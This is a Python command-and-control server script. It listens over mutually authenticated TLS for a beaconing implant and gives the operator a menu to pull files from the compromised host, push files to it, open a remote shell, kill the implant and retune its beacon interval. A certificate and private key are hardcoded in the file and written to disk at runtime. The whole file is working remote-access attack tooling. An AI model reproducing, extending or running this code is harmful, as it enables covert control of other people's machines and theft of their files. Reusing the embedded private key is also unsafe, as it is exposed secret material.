#!/usr/bin/python3
import socket, ssl
from socket import AF_INET, SOCK_STREAM, SO_REUSEADDR, SOL_SOCKET, SHUT_RDWR
from printlib import *
from os import path, remove, kill, getpid
from sys import exit
from signal import SIGTERM

VERBOSE = True

listen_addr = '0.0.0.0'
listen_port = 8080
###NEED TO WRITE EACH FILE ON EXECUTE THEN DELETE ON EXIT

def create_keys():
    server_cert ='''\
-----BEGIN CERTIFICATE-----
MIIDazCCAlOgAwIBAgIUP6DvhuFs2TjmBbb1WwF6Zogv1e8wDQYJKoZIhvcNAQEL
BQAwRTELMAkGA1UEBhMCQVUxEzARBgNVBAgMClNvbWUtU3RhdGUxITAfBgNVBAoM
GEludGVybmV0IFdpZGdpdHMgUHR5IEx0ZDAeFw0yMDAyMjgwNTU5MzlaFw0zMDAy
MjUwNTU5MzlaMEUxCzAJBgNVBAYTAkFVMRMwEQYDVQQIDApTb21lLVN0YXRlMSEw
HwYDVQQKDBhJbnRlcm5ldCBXaWRnaXRzIFB0eSBMdGQwggEiMA0GCSqGSIb3DQEB
AQUAA4IBDwAwggEKAoIBAQC+7zcGw6R/OnPFm+hKZYGPiM4/imSoEMUCgZcDwv7m
/c2O9pB6Y5hhe6wtaLz8cTjVsfHpTRECzlAqxwjSLPjHzBkY639QHnOd+R9VSX9E
WQEslo6i1YRkRR8B8XL1eJnili8h1uLZ/rQmdxAtIwtoJKgsEYaW7Dzh4RWo5nlm
ZUM6Hfh3T3HupyqvXmi4b+EEdCOVMvDZps8QJuHH6ypmbHhF6vwWjoAp1qKZIeqY
ZR+b71DXKBkKRqIsf0ycjZyJxOE0YRqHA+hOtKCGSwN9aMWhG6sQGlpUdbrk+9pz
ATA8AitVE94ZIC0rFLL5ziCLtjPcScnG0i4D6FFmygHPAgMBAAGjUzBRMB0GA1Ud
DgQWBBTNhLMivwkItr7Be3VMj9/6KM3yiTAfBgNVHSMEGDAWgBTNhLMivwkItr7B
e3VMj9/6KM3yiTAPBgNVHRMBAf8EBTADAQH/MA0GCSqGSIb3DQEBCwUAA4IBAQAx
zhmr0jwUkvqeAl46GOUDslgaOrCVYwJj/4R1cGRCb0bQKPbLmoBRn+YDl1wa2ro5
pl/0qro2g4n9f31kFVm3jn3132CONabxz4+pn2hvHOV+qvJ1cs0ZuIRyAX5oYSgF
h8jRgw5kMzLy4zdXXTovEW1nsjO7G3SUc9GC3EOOx3DFRUDC4rgUzBrRCxh2j574
6zrFqAgMD7QKAbMfttcn0JoFV71IPH1X/SATSgHHBfs6DkVYtI4/tPkMkxOBf5hq
CwszvFk5+ZOFJ+o66mAc4OSkt8aiRMxjHg3vSjsrW4EVqGRz+ohuoDDoKIxlgRqN
H1fwfP6xGzn/UjUTNWuz
-----END CERTIFICATE-----'''
    with open("server_cert",'w') as file:
        file.write(server_cert)
    server_key ='''\
-----BEGIN PRIVATE KEY-----
MIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQC+7zcGw6R/OnPF
m+hKZYGPiM4/imSoEMUCgZcDwv7m/c2O9pB6Y5hhe6wtaLz8cTjVsfHpTRECzlAq
xwjSLPjHzBkY639QHnOd+R9VSX9EWQEslo6i1YRkRR8B8XL1eJnili8h1uLZ/rQm
dxAtIwtoJKgsEYaW7Dzh4RWo5nlmZUM6Hfh3T3HupyqvXmi4b+EEdCOVMvDZps8Q
JuHH6ypmbHhF6vwWjoAp1qKZIeqYZR+b71DXKBkKRqIsf0ycjZyJxOE0YRqHA+hO
tKCGSwN9aMWhG6sQGlpUdbrk+9pzATA8AitVE94ZIC0rFLL5ziCLtjPcScnG0i4D
6FFmygHPAgMBAAECggEBAJUwRUa7x+TBv4RAdhjrh3in5MAxWsUXlViH+X+u9Y13
8w4qCmoXOBGzmK1CkaiOr2IKUIOC/C+9FVbXfkT7bshu6Y1XNXtcz+o3pgv2CcNV
6Fz2py0EuRXADKJwDutO+K7buqguR8MeCZWkorciEt+lBOKqLwfuPwQf49S9gU5H
p5nOa0Rrqdx/AwBQZbOqIjL6fA5H/Zmr/koHtAf/V9B0vnPwCdyZbxkHhsv9dTwG
eBB/jjpATXDgd8D1YnBf5kjkrHb2RqQFWnlRuw762OEQwW7n9JNv+F7/xF4tqyzn
/O+enqcnLgJVX/haFTghI4OdbiErTfTG7W5nH8R+1gECgYEA5ovt7DvzuT6e8RCm
rZeTPf0WlIJ3dQK8k0Mn1uPxwJCL0qJHTsKxcFg4z3dWrKxQLS+zaDe80ogpXBUA
+JCopJsMgdaLSZgzuRhH2kdoQy2RUX8anu//pKI4UjndPd8vTGls2An8ymczGXD8
uO67TPv87kQ/EeAyUhFsCCiQGW8CgYEA1AO0SCDZB8tiLGzoksEeHgYkaaKcEbpP
vOkU+APVGZvnXxY6n93TUyfuDZXVolbOf12tngZ9g5zhcKNTcCIehrTLYfzqqjUa
Li3s2j0tLie4PvuaZ+8hFvdZMAwsmkjvjlufxboA70DOjOEeByZv/l73dBLbApva
Cf5NBcumraECgYBOtRrm+Zi9d1l/5zVgMk08bnkU/m2V7vc+N0EUpgFUwoRZxrkd
dG5rclMC0TUwAivlIVHYlJ7MKVwlaa5JLenFOIHOmdY3q9SMrnNpW9OGi7n+3qvR
8xGNvSwJNmQHyXg2WA+mudIpr43Mc7xzzlz3bVfuaDI4Ahhr2DLPnjmD1QKBgQCv
LwBgOQQbtKpCGxtxZ7EDDgA4aOycmV4Zsl5pMIF8z522rB90yU48f9nrz8regOvP
whAbazF69r4w3EOtfAPNOsZzCRC943LmhXwYOESExr0vDabgCm9FEszXLrgMJAgN
kRfLwY3UI7CIJ9sv/Uq83KuLdakR1sWrTD1IdKYdAQKBgCeC8EC2gqBLH1LeTWpN
YP/+BXcxtJmSOPl0Z/giK9iSc6nGaFvWK/TDi7gFMBJs+l2oZhc89INPXckSRFw+
EJh3VJ9H/mM6NhojkNU1l6ueJ9RztQ8phRsBHjTSHpArhEOSd+vOusTTmSEXLP7w
iLwqGqR+AnNGRj4gvSrbqp8c
-----END PRIVATE KEY-----'''
    with open("server_key",'w') as file:
        file.write(server_key)
    client_certs = '''\
-----BEGIN CERTIFICATE-----
MIIDazCCAlOgAwIBAgIUbpFUojamR1OPhQJUwDJzW0W1sG8wDQYJKoZIhvcNAQEL
BQAwRTELMAkGA1UEBhMCQVUxEzARBgNVBAgMClNvbWUtU3RhdGUxITAfBgNVBAoM
GEludGVybmV0IFdpZGdpdHMgUHR5IEx0ZDAeFw0yMDAyMjgwNjAwMDBaFw0yMTAy
MjcwNjAwMDBaMEUxCzAJBgNVBAYTAkFVMRMwEQYDVQQIDApTb21lLVN0YXRlMSEw
HwYDVQQKDBhJbnRlcm5ldCBXaWRnaXRzIFB0eSBMdGQwggEiMA0GCSqGSIb3DQEB
AQUAA4IBDwAwggEKAoIBAQClYnr6PZrghUhxwiwHvNl1zWhc0IDXW/odOe4/mRHS
K5wVhdj25tLA520o/fVxwYt5tSwW48HM2PIRJDeABH88WqlLfILogv6/C5OkJrSD
tyrbNjlUx1yqbiAWbsE6Jmss5CySzHTZgbs5QGVvnxW5DcfQlEWa4pYDLemeETy9
kabLFWPMDkbQq6M8Rc3GAXuTKwW5ym6pBBonVqB0p/nvxMeAh6eQS61D73uv9d0N
AcWWCedpjz+4Js2tYLBMuKrwGOao9RiGg1Su0y9vIp/0n3XJ4HBsTcxMF664e8ED
I7IC3SwCOhWrmhSA8eQ1Kws5dJ8ButW5+80Ikbz/kAeFAgMBAAGjUzBRMB0GA1Ud
DgQWBBSpeICTMVzbAL74rkG7Rp5cdpT/OjAfBgNVHSMEGDAWgBSpeICTMVzbAL74
rkG7Rp5cdpT/OjAPBgNVHRMBAf8EBTADAQH/MA0GCSqGSIb3DQEBCwUAA4IBAQCY
VBDMh+y9uBAn/1S/8xmvttQQYakw1YG0wY5APoCJZPp+SurMh+xDc1dhEW6W5n65
wQTh6VmLwkfBRRLfHBWAtcFO5hW7N8MlvCerXzh30Mld37FrW0KnW7XNpXwC+XJB
KbhxF9OS9fwrQwZa4rtx8xWl93rnxuHG1ZRAPnar79DNCXII3/oh/kfcyaTugrWK
ijlopmmNvPM+rur2VGv8FheKUkyUNM0U7l6NR17ao/hVIzq7ga86e5Xidl8/gbUH
IbWmkL3apSpCeQx2nKBMwT8c+lJixO40meyxpIzTnEuTSHEXYY5/h2jlvNmLcScO
z/BKKDg5xkjlf0TAyaAo
-----END CERTIFICATE-----'''
    with open("client_certs",'w') as file:
        file.write(client_certs)

def delete_keys():
    try:
        remove("client_certs")
        remove("server_cert")
        remove("server_key")
    except FileNotFoundError:
        pass
def send_data(s, plain_text):
    msg = plain_text + "[END]"
    s.send(msg.encode('utf-8'))
    #s.send(encrypt(msg).encode('utf-8')+b"[END]")
    print_info("Sent:\n"  +plain_text)

def file_transfer_get(conn, command):      #get file from server
    send_data(conn, command + "[END]")
    file = command.split()
    dest_filename = file[2]
    f = open(dest_filename,'wb')
    print_info("Grabbing {} --> {}".format(command.split()[1], dest_filename))
    while True: 
        data = conn.recv(128)
        if b"FILE_NOT_FOUND" in data:
            print_fail("File not found")
            f.close()
            remove(dest_filename)
            break
        elif data.endswith(b"[END]"):
            f.write(data.rstrip(b"[END]"))
            print_good("Transfer completed")
            f.close()
            break
        else:
            f.write(data)
    f.close()

def file_transfer_put(conn, commands):       #push file to server
    send_data(conn, commands + "[END]")
    file_name = path.basename(commands.split()[1])
    f = open(file_name, 'rb')
    data = f.read(128)
    if VERBOSE:
        print_info("Sending File:\n" + file_name)
    while data:
        conn.send(data)
        data = f.read(128)
    conn.send("[END]".encode('utf-8'))
    f.close()

def listen_for_data(conn):
    data = ""
    while not data.endswith('[END]'):
        recv = conn.recv(128)
        recv_decoded = recv.decode('utf-8')
        data = data + recv_decoded
    print(data.rstrip("[END]"))

def kill_session(conn, source):
    print_info("Killing {}".format(source))
    send_data(conn, "[kill]")
    conn.close()

def listen():
    options = """\
    1 - Download a File
    2 - Upload a File
    3 - Kill Process (Do not beacon)
    4 - Drop Connection (start beaconing)
    shell - Start a Shell
    beacon - Change Beacon Interval"""

    context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
    context.verify_mode = ssl.CERT_REQUIRED
    context.load_cert_chain(certfile='./server_cert', keyfile='./server_key')
    context.load_verify_locations(cafile='./client_certs')
    #delete_keys()
    bindsocket = socket.socket()
    bindsocket.bind((listen_addr, listen_port))
    bindsocket.listen(1)
    

    while True:
        try:
            print_info("Listening for incoming TCP connection on {}:{}".format(listen_addr,listen_port))
            newsocket, fromaddr = bindsocket.accept()
        except KeyboardInterrupt:
            print_warn("punt")
            exit()
        print_good("Client connected: {}:{}".format(fromaddr[0], fromaddr[1]))
        try:
            conn = context.wrap_socket(newsocket, server_side=True)
            print_info("SSL established. Peer: {}".format(conn.getpeercert()))        
            source = "{}:{}".format(fromaddr[0],fromaddr[1])
            cmd = ""
            try:
                while True:
                    prompt = source + "> "
                    if cmd == "":
                        print(options)
                        cmd = input(prompt) # Get user input and store it in command variable
                    #print(command)

                    if cmd == 'quit' or cmd == 'exit':
                        exit()
                    elif cmd == "1":
                        command = input("get > ")
                        if command != "back":
                            command = "get " + command
                            path_exists = True
                            if len(command.split()) == 1:
                                print_warn("Incomplete command") 
                            elif len(command.split())== 2:
                                command = command + " " + command.split()[1]
                                file_transfer_get(conn, command)
                            elif len(command.split())== 3:
                                if path.dirname(command.split()[2]) != "":
                                    path_exists = path.exists(path.dirname(command.split()[2]))
                                if path_exists:
                                    file_transfer_get(conn, command)
                                else:
                                    print_warn("Destination file path does not exist")
                        cmd = ""
                    elif cmd == "2":
                        command = input("put > ")
                        if command != "back":
                            command = "put " + command
                            path_exists = True
                            if len(command.split()) == 1:
                                print_warn("Incomplete command") 
                            elif len(command.split()) == 2:      #put example
                                if path.isfile(command.split()[1]):
                                    command = command.split()[1] + " " + path.basename(command.split()[1])
                                    file_transfer_put(conn, command)
                                else:
                                    print_warn("File not Found")
                            elif len(command.split())== 3:        #put example temp  [writes example as temp]
                                if path.isfile(command.split()[1]):
                                    file_transfer_put(conn, command)   #(example, temp)  client will determine if arg2 destination filepath exists
                                else:
                                    print_warn("Unable to locate file")
                        cmd = ""
                    elif cmd == "3": # If we got terminate command, inform the client and close the connect and break the loop
                        kill_session(conn, source)
                        break
                    elif cmd == "4":
                        kill(getpid(), SIGTERM)
                    elif cmd == "shell":
                        while cmd == "shell":
                            command = input("shell > ")
                            forbidden = ['get ', 'get', 'put ', 'put']
                            for item in forbidden:
                                if item in command.split():
                                    command = ""
                            if command in forbidden:
                                command = ""
                            elif command == "back":
                                cmd = ""
                            elif command == "":
                                pass
                            else:
                                data = ""
                                send_data(conn, command)
                                #print_info("Sent:\n"+command)
                                while not data.endswith('[END]'):
                                    recv = conn.recv(128)
                                    recv_decoded = recv.decode('utf-8')
                                    data = data + recv_decoded
                                print(data.rstrip("[END]"))
                                data = ""
                    elif cmd.upper() == "BEACON":
                        seconds = input("(seconds)/? > ")
                        send_data(conn, "[BEACON]{}".format(seconds))
                        listen_for_data(conn)
                        cmd = ""
                    else:
                        cmd = ""

            except KeyboardInterrupt:
                kill_session(conn, source)
        except ssl.SSLError:
            print_fail("Received Connection From Malformed (SSL) Session")
        except KeyboardInterrupt:
            kill_session(conn, source)
        except ConnectionAbortedError:
            print_warn("Lost Connection")

def main ():
    try:
        create_keys()
        listen()
    finally:
        delete_keys()
main()